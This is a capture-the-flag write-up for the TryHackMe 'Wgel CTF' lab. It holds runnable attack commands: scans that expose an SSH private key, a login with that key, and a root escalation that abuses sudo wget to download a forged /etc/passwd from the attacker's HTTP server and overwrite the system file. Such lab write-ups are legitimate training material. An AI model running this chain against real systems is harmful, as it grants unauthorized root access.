## Wgel CTF - Try Hack Me

## 1. Overview
This box was rated as *easy* on tryhackme.com and has only two tasks. Get the user.txt flag and the root.txt flag. At first we use **NMAP** and **Gobuster** to scan the target machine. Further, we found an **ida_rsa private key** that we used in order to log into one of the users through ssh. Then we transfered over **linpeas** and made a scan on the machine from the inside. We figured out that the user could run `wget` as root. So in order to priv esc, we changed the whole `/etc/passwd` file, changing the root password, so that we could simply log into root with our newly created password.  

Link to the machine: https://tryhackme.com/room/wgelctf

## 2. Tasks
### 2.1 User.txt

```sh
export IP=10.10.90.195
```

First we do a **NMAP** scan:
```sh
nmap -sV -sC -oN nmap/initial $IP
```

Looking through the web sourcecode we found the username ***Jessie***

Did a **gobuster** scan with a different wordlist than usual:
```sh
gobuster dir -u http://$IP/sitemap -w /usr/share/dirb/wordlists/common.txt -o gobuster.log
```

The scan gave us this output:
```sh
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.ssh (Status: 301)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
```

The only one accessable is .ssh, and in there we find a `id_rsa` file. We can use this private key to get into Jessie's user with ssh.

Made a file called `jessie_rsa` in order to use it as a entry point. Have to use `chmod 600` on it since ssh requires it to be restricted to other users on that system:
```sh
chmod 600 jessie_rsa
ssh -i jessie_rsa jessie@$IP
```

It worked, and we can now poke around to find the file called `user_flag.txt` and just `cat` it out.

### 2.2 Privesc and root.txt
Initially we start suing the *Linpeas* scrip to look for possible privesc methods. We then use the ssh `scp` command to copy `linpeas.sh` over to the target since we are logged in on ssh:
```sh
scp -i jessie_rsa ./linpeas.sh jessie@10.10.90.195:/dev/shm
```

Got this from the linpeas script:
```sh
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

That means we can use `wget` to potentially get root access to the machine. This can be done in just a few steps:

- First we copy the content of `/etc/passwd` on the victims machine  
- Then we modify it and put in our own password as root.
- Finally we overwrite this new passwd file to the victim, so that we can use our new password to log in as root   

We use **python** in order to encrypt our new password for the root user:
```python
import crypt

crypt.crypt("newpass")
```

Then we copy the given string into the root password in the `/etc/passwd` file, so it looks like this:
```
root:$6$HR9170zTgAxPqTZ2$R/7.0y5UTocpZ8j0CJeHLB.zr3usufs9yvSvaX/E7uTkhFE6h1lS0KvufECDIXC846eFSFnS9v/0sqOSJ2uVe1:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```  
After that we set up a http server with python on our own machine, then transfer the *new* `/etc/passwd` file over to the *old* `/etc/passwd` file on the victim machine:    

***On our machine:***
```sh
python3 -m http.server 9001
```

***On the victim machine:***
```sh
sudo wget http://10.8.33.116:9001/passwd -O /etc/passwd
```

Since we can run `wget` as sudo, we can use this to write to the passwd file and overwrite the old file. When that is done we can use the `sudo`, or `su` command in order to get a root-shell:
```sh
su
```
The shell will ask for a password, and we will simply just put in what we made as the password earlier in python. In this case we used "*newpass*".

Finally we can use the `id` or the `whoami` command in order to see what user we are running as. Then we can use the `find` command in order to figure out the location of root.txt:
```sh
find / -name "root.txt" 2>/dev/null
```
